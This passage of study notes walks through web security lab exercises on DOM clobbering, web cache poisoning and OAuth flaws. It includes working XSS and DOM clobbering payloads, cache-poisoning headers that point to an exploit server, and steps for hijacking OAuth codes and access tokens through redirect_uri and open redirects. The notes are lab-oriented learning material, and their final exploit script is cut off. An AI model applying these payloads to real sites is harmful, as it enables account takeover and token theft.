thebehavior</strong> of JavaScript on the page.</li><li>DOM clobbering is particularly useful in cases where <strong>XSS isnot possibl</strong>e, but you can control some HTML on a page where theattributes <code>id</code> or <code>name</code> are whitelisted by theHTML filter.</li></ol><h4 id="lab-exploiting-dom-clobbering-to-enable-xss">Lab: Exploiting DOMclobbering to enable XSS</h4><ol type="1"><li><p>Go to one of the blog posts and create a comment containing thefollowing anchors:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultAvatar</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultAvatar</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>avatar</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cid:<span class="token entity named-entity" title="&quot;">&amp;quot;</span>onerror=alert(1)//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li><li><p>Return to the blog post and create a second comment containingany random text. The next time the page loads, the <code>alert()</code>is called.</p></li><li><p>The page for a specific blog post imports the JavaScript file<code>loadCommentsWithDomPurify.js</code>, which contains the followingcode:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> defaultAvatar <span class="token operator">=</span> window<span class="token punctuation">.</span>defaultAvatar <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">'/resources/images/avatarDefault.svg'</span><span class="token punctuation">&#125;</span></code></pre><p>The <code>defaultAvatar</code> object is implemented using thisdangerous pattern containing the logical <code>OR</code> operator inconjunction with a global variable. This makes it vulnerable to DOMclobbering</p></li><li><p>Notice that the site uses the <code>DOMPurify</code> filter in anattempt to reduce DOM-based vulnerabilities. However, DOMPurify allowsyou to use the <code>cid: protocol</code>, which does not URL-encodedouble-quotes. This means you can inject an encoded double-quote thatwill be decoded at runtime. As a result, the injection described abovewill cause the defaultAvatar variable to be assigned the clobberedproperty <code>&#123;avatar: ‘cid:"onerror=alert(1)//’&#125;</code> the next timethe page is loaded.</p></li></ol><h4 id="lab-clobbering-dom-attributes-to-bypass-html-filters">Lab:Clobbering DOM attributes to bypass HTML filters</h4><ol type="1"><li><p>Go to one of the blog posts and create a comment containing thefollowing HTML:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token attr-name">tabindex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>0</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>attributes</span><span class="token punctuation">></span></span></code></pre><p>The library uses the <code>attributes</code> property to filter HTMLattributes. However, it is still possible to clobber the<code>attributes</code> property itself, causing the length to beundefined. This allows us to inject any attributes we want into the<code>form</code> element. In this case, we use the <code>onfocus</code>attribute to smuggle the <code>print()</code> function.</p></li><li><p>Go to the exploit server and add the following<code>iframe</code> to the body:</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)"></code></pre><p>When the <code>iframe</code> is loaded, after a 500ms delay, it addsthe <code>#x</code> fragment to the end of the page URL. The delay isnecessary to make sure that the comment containing the injection isloaded before the JavaScript is executed. This causes the browser tofocus on the element with the ID <code>"x"</code>, which is the form wecreated inside the comment. The <code>onfocus</code> event handler thencalls the <code>print()</code> function.</p></li></ol><h3 id="web-cache-poisoning">Web cache poisoning</h3><h4 id="what-is-web-cache-poisoning">What is web cache poisoning?</h4><p>1.As with most kinds of attack, web cache poisoning can also be usedin <strong>combination</strong> with other attacks to<code>escalate</code> the potential impact even further.</p><h4 id="identify-and-evaluate-unkeyed-inputs">Identify and evaluateunkeyed inputs</h4><ol type="1"><li>You can use tools such as <code>Burp Comparer</code> to compare theresponse with and without the injected input, but this still involves asignificant amount of manual effort.</li><li>Fortunately, you can automate the process of identifying unkeyedinputs by adding the <code>Param Miner extension</code> to Burp from theBApp store</li></ol><h4 id="elicit-a-harmful-response-from-the-back-end-server">Elicit aharmful response from the back-end server</h4><ol type="1"><li>If an input is <code>reflected</code> in the response from theserver without being properly sanitized, or is used to dynamicallygenerate other data, then this is a potential entry point for web cachepoisoning.</li></ol><h4 id="get-the-response-cached">Get the response cached</h4><ol type="1"><li>Whether or not a response gets cached can depend on <strong>allkinds of factors</strong>, such as the file extension, content type,route, status code, and response headers.</li></ol><hr /><ol type="1"><li>Some websites use unkeyed headers to <strong>dynamically generateURLs</strong> for importing resources, such as externally hostedJavaScript files.</li></ol><h4 id="lab-web-cache-poisoning-with-an-unkeyed-header">Lab: Web cachepoisoning with an unkeyed header</h4><ol type="1"><li><strong>necessary</strong>:add a cache-buster query parameter.</li><li>first send request:<imgsrc="https://s2.loli.net/2023/08/26/wKcasBzxkgVJdmR.png"alt="image-20230826145741061" /><ol type="1"><li>it's wrong: extra backslashes<imgsrc="https://s2.loli.net/2023/08/26/jQ5CHMJBwzbPgqF.png"alt="image-20230826145937236" /></li></ol></li><li>exploit server body: <code>alert(document.cookie)</code></li><li>don't send requrest above againuntill:<code>X-Cache: hit</code></li></ol><h4 id="lab-web-cache-poisoning-with-an-unkeyed-cookie">Lab: Web cachepoisoning with an unkeyed cookie</h4><ol type="1"><li><p>load homepage, send request to repeater,add cache buster queryparameter,send<imgsrc="https://s2.loli.net/2023/08/30/XMOErBqd8h7DRT5.png"alt="image-20230830020552467" /></p></li><li><p>Place a suitable XSS payload in the <code>fehost</code>cookie</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">fehost<span class="token operator">=</span>someString<span class="token string">"-alert(1)-"</span>someString</code></pre></li><li><p>delete query parameter, repeatedly sendingrequest:<code>X-cache:hit</code></p></li></ol><h4 id="lab-web-cache-poisoning-with-multiple-headers">Lab: Web cachepoisoning with multiple headers</h4><ol type="1"><li>attention: this request<imgsrc="https://s2.loli.net/2023/08/30/XpmbwtR612g3dvy.png"alt="image-20230830025750939" /></li><li>craft an exploit<imgsrc="https://s2.loli.net/2023/08/30/fGAlM4u6HozO8RY.png"alt="image-20230830025809355" /></li></ol><h4 id="lab-targeted-web-cache-poisoning-using-an-unknown-header">Lab:Targeted web cache poisoning using an unknown header</h4><ol type="1"><li><p>With the Param Miner extension enabled, right-click on therequest and select "Guess headers". After a while, Param Miner willreport that there is a secret input in the form of the<code>X-Host</code> header<imgsrc="https://s2.loli.net/2023/08/30/n1c3xTH9V6QlFut.png"alt="image-20230830035435896" /><imgsrc="https://s2.loli.net/2023/08/30/R2uLA5iGBsnY6Sk.png"alt="image-20230830035516347" /></p></li><li><p>Notice that the <code>Vary</code> header is used to specify thatthe <code>User-Agent</code> is part of the cache key. To target thevictim, you need to find out their <code>User-Agent</code>.<imgsrc="https://s2.loli.net/2023/08/30/xmlSHUJPfAGcENZ.png"alt="image-20230830035616434" /></p></li><li><p>On the website, notice that the comment feature allows certainHTML tags. Post a comment containing a suitable payload to cause thevictim's browser to interact with your exploit server, for example:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></code></pre></li><li><p>Go to the exploit server and click the button to open the "Accesslog". Refresh the page every few seconds until you see requests made bya different user. This is the victim. Copy their <code>User-Agent</code>from the log<imgsrc="https://s2.loli.net/2023/08/30/fPEWQGS6Own9IbK.png"alt="image-20230830035809980" /></p></li><li><p>modify the <code>User-Agent</code><imgsrc="https://s2.loli.net/2023/08/30/y9o2lucfSzAYb4p.png"alt="image-20230830035919693" /></p></li></ol><h4id="lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria">Lab:Web cache poisoning to exploit a DOM vulnerability via a cache withstrict cacheability criteria</h4><ol type="1"><li><p>Use <code>Param Miner</code> to identify that theX-Forwarded-Host header is supported.</p></li><li><p>Notice that this header overwrites the <code>data.host</code>variable, which is passed into the <code>initGeoLocate()</code>function.<img src="https://s2.loli.net/2023/08/30/QUZWsIX7cSHL6tJ.png"alt="image-20230830140725833" /><imgsrc="https://s2.loli.net/2023/08/30/Itpf41bv7LREXcM.png" /></p></li><li><p>Study the <code>initGeoLocate</code>() function in<code>/resources/js/geolocate.js</code> and notice that it is vulnerableto <code>DOM-XSS</code> due to the way it handles the incoming JSONdata.</p></li><li><p>craft an exploit<imgsrc="https://s2.loli.net/2023/08/30/hPjGimFxfYEWXB8.png"alt="image-20230830141110187" /></p></li><li><p>In Burp Repeater, add the following header, remembering to enteryour own exploit server ID:</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span></span></code></pre></li></ol><h4 id="lab-combining-web-cache-poisoning-vulnerabilities">Lab:Combining web cache poisoning vulnerabilities</h4><ol type="1"><li>In Burp Repeater, experiment with the <code>X-Forwarded-Host</code>header and observe that it can be used to import an arbitrary JSON fileinstead of the <code>translations.json</code> file, which containstranslations of UI texts.</li><li>Notice that the website is vulnerable to DOM-XSS due to the way the<code>initTranslations()</code> function handles data from the JSON filefor all languages except English.</li><li>Observe that the <code>X-Original-URL</code> can be used to changethe path of the request, so you can explicitly set<code>/setlang/es</code>. However, you will find that this responsecannot be cached because it contains the <code>Set-Cookie</code>header.<img src="https://s2.loli.net/2023/08/30/oEM1K7bPxqlgsck.png"alt="image-20230830161720060" /></li><li>Observe that the home page sometimes uses backslashes as a folderseparator. Notice that the server normalizes these to forward slashesusing a redirect. Therefore, <code>X-Original-URL: /setlang\es</code>triggers a 302 response that redirects to <code>/setlang/es</code>.Observe that this 302 response is cacheable and, therefore, can be usedto force other users to the Spanish version of the home page.<imgsrc="https://s2.loli.net/2023/08/30/iN6zo8QBD97bnKI.png" /></li><li>posion two requests<ol type="1"><li>You now need to combine these two exploits. First, poison the<code>GET /?localized=1</code> page using the<code>X-Forwarded-Host</code> header to import your malicious JSON filefrom the exploit server.</li><li>Now, while the cache is still poisoned, also poison the<code>GET /</code> page using <code>X-Original-URL: /setlang\es</code>to force all users to the Spanish page.</li></ol></li></ol><h4 id="exploiting-cache-implementation-flaws">Exploiting cacheimplementation flaws</h4><ol type="1"><li>A <code>cache oracle</code> is simply a page or endpoint thatprovides feedback about the cache's behavior.</li></ol><h4 id="cache-probing-methodology">Cache probing methodology</h4><ol type="1"><li>Identify a suitable cache oracle</li><li>Probe key handling</li></ol><h4 id="identify-an-exploitable-gadget">Identify an exploitablegadget</h4><hr /><h4 id="lab-web-cache-poisoning-via-an-unkeyed-query-string">Lab: Webcache poisoning via an unkeyed query string</h4><ol type="1"><li><p>you can use the <code>Pragma: x-get-cache-key</code> header todisplay the cache key in the response.</p></li><li><p>Although you can't use a query parameter as a cache buster, thereis a common request header that will be keyed if present. You can usethe <code>Param Miner</code> extension to automatically add a cachebuster header to your requests.</p></li><li><p>Notice that <code>Homepage</code> is a potential cache oracle.Send the request to Burp Repeater.</p></li><li><p>Notice that you can use the <code>Origin</code> header as a cachebuster. Add it to your request.<imgsrc="https://s2.loli.net/2023/08/30/QiDpArafkRXqFIo.png"alt="image-20230830191914020" /></p></li><li><p>Add an arbitrary parameter that breaks out of the reflectedstring and injects an <ahref="https://portswigger.net/web-security/cross-site-scripting">XSS</a>payload:<img src="https://s2.loli.net/2023/08/30/x3vXHdsTqaIU9my.png"alt="image-20230830192305902" /></p><pre class="language-http" data-language="http"><code class="language-http">GET /?evil='/>&lt;script>alert(1)&lt;/script></code></pre></li><li><p>To simulate the victim, <strong>remove</strong> the query stringfrom your request and send it again (while using the same cache buster).Check that you still receive the cached response containing yourpayload.<img src="https://s2.loli.net/2023/08/30/OQDszH5c73xSRXp.png"alt="image-20230830192313590" /></p></li><li><p>Remove the cache-buster <code>Origin</code> header and add yourpayload back to the query string.. Replay the request until you havepoisoned the cache for normal users.<imgsrc="https://s2.loli.net/2023/08/30/rSYpEA6nZKmke7I.png"alt="image-20230830192428705" /></p></li><li><p>load original homepage</p></li></ol><h4 id="lab-web-cache-poisoning-via-an-unkeyed-query-parameter">Lab: Webcache poisoning via an unkeyed query parameter</h4><ol type="1"><li>Use Param Miner's "Guess GET parameters" feature to identify thatthe parameter <code>utm_content</code> is supported by theapplication.<strong>Not sure</strong> which specific functionalityoption to choose.<imgsrc="https://s2.loli.net/2023/08/30/GYD4jysud5cxOh6.png"alt="image-20230830231938057" /></li><li>send <strong>request1</strong> to <code>repeater</code>,<code>Origin</code> parameter is redundant here<imgsrc="https://s2.loli.net/2023/08/30/dHnaKFGTeq3J5tv.png"alt="image-20230830232028525" /></li><li>remove <code>utm_content</code>, send again</li></ol><h4 id="cache-parameter-cloaking">Cache parameter cloaking</h4><ol type="1"><li><p>Of particular interest are any parsing<strong>discrepancies</strong> between the cache and the application.This can potentially allow you to sneak arbitrary parameters into theapplication logic by "<strong>cloaking</strong>" them in an excludedparameter.</p></li><li><p>Let's assume that the algorithm for excluding parameters from thecache key behaves in this way, but the server's algorithm only acceptsthe <strong>first</strong> <code>?</code> as a delimiter. Consider thefollowing request:</p><pre class="language-http" data-language="http"><code class="language-http">GET /?example=123?excluded_param=bad-stuff-here</code></pre></li></ol><h4 id="lab-parameter-cloaking">Lab: Parameter cloaking</h4><ol type="1"><li>craft an exploit<imgsrc="https://s2.loli.net/2023/08/31/wBTjr9XQELxVlKS.png"alt="image-20230831005611948" /></li></ol><h4 id="lab-web-cache-poisoning-via-a-fat-get-request">Lab: Web cachepoisoning via a fat GET request</h4><ol type="1"><li>craft an exploit<imgsrc="https://s2.loli.net/2023/08/31/cbBg5hPaDXprO9n.png"alt="image-20230831012140343" /></li></ol><h4 id="lab-url-normalization">Lab: URL normalization</h4><ol type="1"><li>poison the cache<imgsrc="https://s2.loli.net/2023/08/31/nv7yCkiE92lrohw.png"alt="image-20230831020310877" /></li><li>immediately load the URL in the browser.</li></ol><h4 id="cache-key-injection">Cache key injection</h4><ol type="1"><li><p><strong>!important</strong>:use http/1.1<imgsrc="https://s2.loli.net/2023/08/31/3ljt4S6hqAwpCiJ.png"alt="image-20230831180830030" /></p></li><li><p>If the cache doesn't implement proper<code>escaping of the delimiters</code> between the components, you canpotentially exploit this behavior to craft two<strong>different</strong> requests that have the same cachekey.</p></li><li><p>Observe that the redirect at <code>/login</code> excludes theparameter <code>utm_content</code> from the cache key using a flawedregex. This allows you append arbitrary unkeyed content to the<code>lang</code> parameter:</p><pre class="language-http" data-language="http"><code class="language-http">/login?lang=en?utm_content=anything</code></pre><figure><img src="https://s2.loli.net/2023/08/31/O2uICQzDeKxPlsh.png"alt="image-20230831180857955" /><figcaption aria-hidden="true">image-20230831180857955</figcaption></figure></li><li><p>Observe that the page at <code>/login/</code> has an import from<code>/js/localize.js</code>. This is vulnerable to client-sideparameter pollution via the <code>lang</code> parameter because itdoesn't URL-encode the value.</p></li><li><p>Observe that the login page references an endpoint at<code>/js/localize.js</code> that is vulnerable to response headerinjection via the <code>Origin</code> request header, provided the<code>cors</code> parameter is set to <code>1</code>.</p><ol type="1"><li>posion cache1<imgsrc="https://s2.loli.net/2023/08/31/FuWmRbe6wONsxcP.png"alt="image-20230831180930482" /></li><li>posion cache2: Make sure the previous request <strong>hits</strong>the cache.<img src="https://s2.loli.net/2023/08/31/4MdIkveqSufhHGQ.png"alt="image-20230831181505693" /></li></ol></li><li><p>Use the <code>Pragma: x-get-cache-key</code> header to identifythat the server is vulnerable to cache key injection, meaning the headerinjection can be triggered via a crafted URL.</p></li></ol><h4 id="poisoning-internal-caches">Poisoning internal caches</h4><ol type="1"><li>some websites implement caching behavior <strong>directly</strong>into the application in addition to using a distinct,<code>external</code> component. This can have several advantages, suchas avoiding the kind of parsing <strong>discrepancies</strong> we lookedat earlier.</li><li>Users might then receive a response comprising a<strong>mixture</strong> of content from the server, as well as severalindividual fragments from the cache.</li><li>As these cached fragments are intended to be reusable acrossmultiple distinct responses, the concept of a cache key<strong>doesn't</strong> really apply.</li><li>especially if you poison a fragment that is used on every page. Asthere is no cache key, you would have poisoned every page, for everyuser, with a single request.</li></ol><h5 id="how-to-identify-internal-caches">How to identify internalcaches</h5><ol type="1"><li>if the response reflects a <strong>mixture</strong> of both inputfrom the last request you sent and input from a previous request, thisis a key indicator that the cache is storing fragments rather thanentire responses.</li><li>The same applies if your input is reflected in responses on<strong>multiple</strong> distinct pages, in particular on pages inwhich you <strong>never</strong> tried to inject your input.</li></ol><h4 id="lab-internal-cache-poisoning">Lab: Internal cache poisoning</h4><ol type="1"><li><p>Observe that the <code>X-Forwarded-Host</code> header issupported. Add this to your request, containing your exploit serverURL:<img src="https://s2.loli.net/2023/08/31/quFdZPj2BozScxL.png"alt="image-20230831204020522" /></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span></span></code></pre></li><li><p>Send the request. most of the time, you will see that the URL forthe <code>canonical link</code> element and the<code>analytics.js</code> import now both point to your exploit server,but the <code>geolocate.js</code> import URL remains the same.<imgsrc="https://s2.loli.net/2023/08/31/kqHwRWs6LjoOnY7.png"alt="image-20230831204034127" /></p></li><li><p>Keep sending the request. Eventually, the URL for the<code>geolocate.js</code> resource will also be<strong>overwritten</strong> with your exploit server URL. This<strong>indicates</strong> that this fragment is being cached separatelyby the internal cache. Notice that you've been getting a cache hit forthis fragment even with the cache-buster query parameter - the querystring is unkeyed by the internal cache.<imgsrc="https://s2.loli.net/2023/08/31/CRmjuIq7O3fnF82.png"alt="image-20230831204159068" /></p></li><li><p>Remove the <code>X-Forwarded-Host</code> header and resend therequest. Notice that the internally cached fragment still reflects yourexploit server URL, but the other two URLs <strong>donot</strong></p></li><li><p>Go to the exploit server and create a file at<code>/js/geolocate.js</code> containing the payload<code>alert(document.cookie)</code>. Store the exploit.</p></li></ol><h3 id="oauthentication-vulnerabilities">Oauthenticationvulnerabilities</h3><h4 id="oauth-2.0-authentication-vulnerabilities">OAuth 2.0authentication vulnerabilities</h4><ol type="1"><li><code>OAuth</code> is a commonly used authorization framework thatenables websites and web applications to request<code>limited access</code> to a user's account on anotherapplication.</li><li>OAuth allows the user to grant this access without exposing theirlogin credentials to the requesting application.This means users canfine-tune which data they want to share <strong>rather than</strong>having to hand over full control of their account to a third party.</li><li>For example, an application might use OAuth to request access toyour email contacts list so that it can suggest people to connect with.However, the same mechanism is also used to provide<code>third-party</code> authentication services, allowing users to login with an account that they have with a different website.</li><li><code>OAuth 2.0</code> was written from scratch rather than beingdeveloped directly from <code>OAuth 1.0</code>. As a result, the two arevery different.</li></ol><h4 id="how-does-oauth-2.0-work">How does OAuth 2.0 work?</h4><ol type="1"><li>OAuth 2.0 was originally developed as a way of<code>sharing access</code> to specific data <strong>betweenapplications</strong>.</li><li>It works by defining a series of interactions between<code>three distinct parties</code>, namely a client application, aresource owner, and the OAuth service provider<ol type="1"><li><strong>Client application</strong> - The website or web applicationthat wants to access the user's data.</li><li><strong>Resource owner</strong> - The user whose data the clientapplication wants to access.</li><li><strong>OAuth service provider</strong> - The website or applicationthat controls the user's data and access to it. They support OAuth byproviding an API for interacting with both an authorization server and aresource server.</li></ol></li><li>In this topic, we'll focus on the "<code>authorization code</code>"and "<code>implicit</code>" grant types as these are by far the mostcommon. Broadly speaking, both of these grant types involve thefollowing stages:<ol type="1"><li>The client application <code>requests</code> access to a subset ofthe user's data, specifying which grant type they want to use and whatkind of access they want.</li><li>The user is prompted to log in to the OAuth service and explicitly<code>give their consent</code> for the requested access.</li><li>The client application <code>receives a unique access</code> tokenthat proves they have permission from the user to access the requesteddata. Exactly how this happens varies significantly depending on thegrant type.</li><li>The client application uses this access token to<code>make API calls</code> fetching the relevant data from the resourceserver.</li></ol></li></ol><h4 id="oauth-grant-types">OAuth grant types</h4><ol type="1"><li><p>The OAuth grant type determines the<code>exact sequence of steps</code> that are involved in the OAuthprocess The grant type also affects <strong>how</strong> the clientapplication <strong>communicates</strong> with the OAuth service at eachstage, including how the access token itself is sent. For this reason,grant types are often referred to as "<code>OAuth flows</code>"</p></li><li><p><code>scope</code> parameter of the authorization request:</p><ol type="1"><li>specify which data</li><li>operations to perform</li></ol></li><li><p>The user is asked whether they consent to the requested access.If they accept, the client application is granted an"<code>authorization code</code>".</p></li><li><p><code>Authorization code grant type</code><imgsrc="https://s2.loli.net/2023/11/30/VjJYqgTPpi72h1o.jpg"alt="oauth-authorization-code-flow" /></p><ol type="1"><li>```http redirect_uri <pre class="language-none"><code class="language-none">      The URI to which the user&#39;s browser should be redirected when sending the authorization code to the client application. This is also known as the &quot;callback URI&quot; or &quot;callback endpoint&quot;. Many OAuth attacks are based on exploiting flaws in the validation of this parameter.5. &#96;Implicit grant type&#96;   1. When using the implicit grant type, **all** communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. ![oauth-implicit-flow](https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;11&#x2F;30&#x2F;WPvLZCAsRoqhDwl.jpg)#### OAuth authentication1. For example, you&#39;re probably familiar with the option many websites provide to log in using your **existing social media account** rather than having to register with the website in question. Whenever you see this option, there&#39;s a good chance it is built on OAuth 2.0.#### Lab: Authentication bypass via OAuth implicit flow1. click &quot;&#96;&#96;my-account&#96;&quot; to login, make sure that &quot;&#96;intercept is on&#96;&quot;,整个过程产生如下请求：![image-20231130053132897](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Jf710001011&#x2F;pictureBed@main&#x2F;img&#x2F;202311300531022.png)2. 最为关键的请求为：&#96;POST &#x2F;authenticate&#96;,send to &#96;repeat&#96;    1. modify the &quot;&#96;email&#96;&quot; to carlos&#39;![image-20231130053149716](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Jf710001011&#x2F;pictureBed@main&#x2F;img&#x2F;202311300531839.png)#### How do OAuth authentication vulnerabilities arise?1. Regardless of which OAuth grant type is being used, the &#96;first request&#96; of the flow will always be a request to the &#96;&#x2F;authorization&#96; endpoint containing a number of query parameters that are used specifically for OAuth.2. Once you know the &#96;hostname of the authorization server&#96;, you should always try sending a &#96;GET&#96; request to the following standard endpoints:   &#96;&#96;&#96;http   &#x2F;.well-known&#x2F;oauth-authorization-server   &#x2F;.well-known&#x2F;openid-configuration</code></pre></li></ol></li><li><p>Vulnerabilities can arise in the client<code>application's implementation of OAuth</code> as well as in the<code>configuration of the OAuth service itself</code></p></li></ol><h4 id="improper-implementation-of-the-implicit-grant-type">Improperimplementation of the implicit grant type</h4><ol type="1"><li>The <strong>trouble</strong> is, if the application wants tomaintain the session after the user closes the page, it needs to storethe <code>current user data</code> (normally a user ID and the accesstoken) somewhere.</li><li>if the client application doesn't properly check that the accesstoken <strong>matches</strong> the other data in the request</li></ol><h4 id="flawed-csrf-protection">Flawed CSRF protection</h4><ol type="1"><li>Therefore, if you notice that the authorization request <strong>doesnot</strong> send a <code>state</code> parameter, this is extremelyinteresting from an attacker's perspective.</li><li>In this case, if the application fails to use the <code>state</code>parameter, an attacker could potentially hijack a victim user's accounton the client application <strong>by</strong> binding it to their ownsocial media account.</li></ol><h4 id="lab-forced-oauth-profile-linking">Lab: Forced OAuth profilelinking</h4><ol type="1"><li>use a <a href="https://portswigger.net/web-security/csrf">CSRFattack</a> to attach your own social media profile to the<code>admin</code> user's account on the blog website, then access theadmin panel and delete <strong>carlos</strong>.</li></ol><hr /><ol type="1"><li>login with with your <code>username &amp; password</code><imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020918908.png"alt="image-20231202091806699" /></li><li>Attach a social profile<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020919483.png"alt="image-20231202091911343" /></li><li>use your social media credentials to complete the OAuth flow.<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020920725.png"alt="image-20231202092024607" /></li><li>In the proxy history, study the series of<code>requests for attaching a social profile</code><imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020921785.png"alt="image-20231202092128689" /><ol type="1"><li>In the <code>GET /auth?client_id[...]</code> request, observe thatthe <code>redirect_uri</code> for this functionality sends theauthorization code to <code>/oauth-linking</code> ; Importantly, noticethat the request does not include a <code>state</code> parameter toprotect against CSRF attacks.</li></ol></li><li>Turn on proxy interception and select the "Attach a social profile"option again.<ol type="1"><li>forward until you see this request<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020926304.png"alt="image-20231202092630082" /><ol type="1"><li>right click,copy url<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020927421.png"alt="image-20231202092716289" /></li><li>make an exploit<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020929714.png"alt="xx" /></li><li>Deliver exploit to victim</li><li>observe the access log<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020930778.png"alt="image-20231202093043613" /></li></ol></li></ol></li><li>refresh the web page<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312020932627.png"alt="image-20231202093204506" /></li></ol><hr /><ol type="1"><li>Note that if the site allows users to log in<strong>exclusively</strong> via OAuth, the <code>state</code> parameteris arguably less critical. However, not using a <code>state</code>parameter can still allow attackers to construct login <code>CSRF</code>attacks, whereby the user is tricked into logging in to the attacker'saccount.</li></ol><h4 id="lab-oauth-account-hijacking-via-redirect_uri">Lab: OAuth accounthijacking via redirect_uri</h4><ol type="1"><li><p>observe the two requests</p><ol type="1"><li><p><code>GET /auth?client_id=nf3e8gcgjtehcvqgsgf5k&amp;redirect_uri=https://0a2f00220493cb5080aa03c600510087.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email</code></p><p>observe that you can submit any arbitrary value as the<code>redirect_uri</code> without encountering an error</p></li><li><p><code>GET /oauth-callback?code=ufujmlosSlAWkD7MjsXil1YQsfeSOdApTCuSTRFNFW</code></p></li></ol></li><li><p>make an exploit<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312061431185.png"alt="image-20231206143134950" /></p></li><li><p>inspect <strong>access log</strong><imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312061432281.png"alt="image-20231206143255126" /></p><ol type="1"><li>Copy code</li></ol></li><li><p>paste here<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202312061433237.png"alt="image-20231206143342093" /></p></li></ol><h4 id="flawed-redirect_uri-validation">Flawed redirect_urivalidation</h4><ol type="1"><li>when the OAuth service receives a new request, it can validate theredirect_uri parameter against this <code>whitelist</code>. In thiscase, supplying an external URI will likely result in an error.</li></ol><h4 id="lab-stealing-oauth-access-tokens-via-an-open-redirect">Lab:Stealing OAuth access tokens via an open redirect</h4><ol type="1"><li>Flawed validation by the OAuth service makes it possible for anattacker to <code>leak access tokens</code> to <strong>arbitrarypages</strong> on the client application</li><li>identify an <code>open redirect</code> on the blog website and usethis to steal an <code>access token</code> for the admin user'saccoun</li></ol><hr /><ol type="1"><li><p>In Repeater, experiment with the<code>GET /auth?client_id=[...]</code> request. Observe that you cannotsupply an external domain as <code>redirect_uri</code> because it'sbeing validated against a whitelist. However, you can append additionalcharacters to the default value without encountering an error, includingthe <code>/../</code> path traversal sequence.<imgsrc="https://s2.loli.net/2023/12/08/VczaSCoXsxt5Qkr.png"alt="image-20231208145453412" /></p></li><li><p>Confirm that the <code>redirect_uri</code> parameter is in factvulnerable to <a href="#directory-traversal">directory traversal</a> bychanging it to:</p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;oauth-callback&#x2F;..&#x2F;post?postId&#x3D;1</code></pre><p>Forward any remaining requests and observe that you are eventuallyredirected to the first blog post. In the browser, notice that your<code>access token</code> is included in the URL as a fragment.<imgsrc="https://s2.loli.net/2023/12/08/JrQV2l7dfj3Keaq.png"alt="image-20231208145622642" /></p></li><li><p>Identify the "<strong>Next post</strong>" option at the bottom ofeach blog post, which works by redirecting users to the path specifiedin a query parameter. Send the corresponding<code>GET /post/next?path=[...]</code> request to Repeater.<imgsrc="https://s2.loli.net/2023/12/08/6EqefrnBm5XJyQO.png"alt="image-20231208145718124" /></p></li><li><p>make an exploit</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span> <span class="token 